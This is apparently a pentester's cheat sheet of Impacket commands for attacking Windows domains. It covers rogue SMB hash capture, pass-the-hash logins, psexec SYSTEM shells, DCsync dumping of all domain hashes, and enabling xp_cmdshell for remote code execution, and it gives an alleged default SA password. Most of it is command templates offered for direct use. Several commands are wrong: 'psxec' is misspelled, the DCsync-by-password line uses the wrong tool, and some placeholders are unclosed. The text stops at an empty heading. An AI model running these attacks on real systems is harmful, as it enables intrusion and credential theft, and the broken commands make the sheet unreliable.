
Impackets is an invaluable library of python-based exploitation tools.  The library also reuses a lot of authentication methods and syntax, so in a lot of cases you can get away with simply changing the specific impacket command being ran without needing to change any parameters.

On Kali Linux, the impacket library is in your path by default and each python script is prefaced with "impacket-" for more intuitive usage.

```shell
# Example Usage of Raw Library
python3 psexec.py <domain>/<username>:'<password'@<target>

# Example Usage on Kali Linux
impacket-psexec <domain>/<username>:'<password'@<target>
```

### impacket-smbserver
---
Create a simple unauthenticated SMB server that can host files and capture the NTLM hash of visitors.

```shell
# Host Current Directory
impacket-smbserver <share_name> -smb2support .

# Host Specified Directory
impacket-smbserver <share_name> -smb2support <path_to_serve>

# Path to Share
# \\<ip_addr>\<share_name>\<hosted_files>
```

### impacket-smbclient
---
Connect to a workstation via SMB and attempt to interact with with available shares. (Requirements: Valid user credentials.)

```shell
# Smbclient via Password
impacket-smbclient <domain>/<username>:'<password'@<target>

# Smbclient via Pass-the-Hash
impacket-smbclient <domain>/<username>@<target> -hashes <ntlm>:<ntlm>

# Smbclient via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-smbclient <domain>/<username>@<target> -k -no-pass

# Common Commands             : cat, ls, cd, mkdir, rmdir
# List Available Shares       : shares
# Mount Share                 : use <share_name>
# Upload File                 : put <local_filename>
# Download File               : get <remote_filename>
# Download All Files from PWD : mget <match_mask>
# Change the User's Password  : password
# Return Host Information     : info
```

### impacket-psexec
---
Acquire a SYSTEM level shell via exploiting write privileges in the default ADMIN$ share. (Requirements: Credentials for a user with SMB write privileges to the ADMIN$ share.)

```shell
# Psexec via Password
impacket-psxec <domain>/<username>:'<password'@<target>

# Psexec via Pass-the-Hash
impacket-psexec <domain>/<username>@<target> -hashes <ntlm>:<ntlm>

# Psexec via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-psexec <domain>/<username>@<target> -k -no-pass

# Optional: add a specific command to execute (default: cmd.exe)
impacket-psxec <domain>/<username>:'<password>'@<target> '<command_to_execute>'

# Return Help                    : help
# Execute Local Commands         : !<local_command>
# Upload Files to Temp Directory : lput <local_file> Temp
```

### impacket-secretsdump
---
Perform a DCsync attack on a Domain Controller and dump all user and machine hashes within the domain. (Requirements: Domain Administrator Privileges)

```shell
# DCsync via Password
impacket-psxec <domain>/<domain_admin>:'<password>'@<target_dc> > <outfile.txt>

# DCsync via Pass-the-Hash
impacket-secretsdump <domain>/<domain_admin>@<target_dc> -hashes <ntlm>:<ntlm> > <outfile.txt>

# DCsync via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-secretsdump <domain>/<domain_admin>@<target_dc> -k -no-pass > <outfile.txt>
```

### impacket-mssqlclient
---
Connect to a MS-SQL database. (Requirements: Valid DB user credentials.)

```shell
# Connect to MS-SQL Server
impacket-mssqlclient <username>:'<password>'@<target>

# Connect to MS-SQL Server via default SA creds
impacket-mssqlclient sa:'poiuytrewq'@<target>

# Enable XP_CMDSHELL for Remote Code Exection
> EXECUTE sp_configure 'show advanced options', 1;
> RECONFIGURE;
> EXECUTE sp_configure 'xp_cmdshell', 1;
> RECONFIGURE;
> xp_cmdshell '<command>'
```

### impacket-addcomputer
---
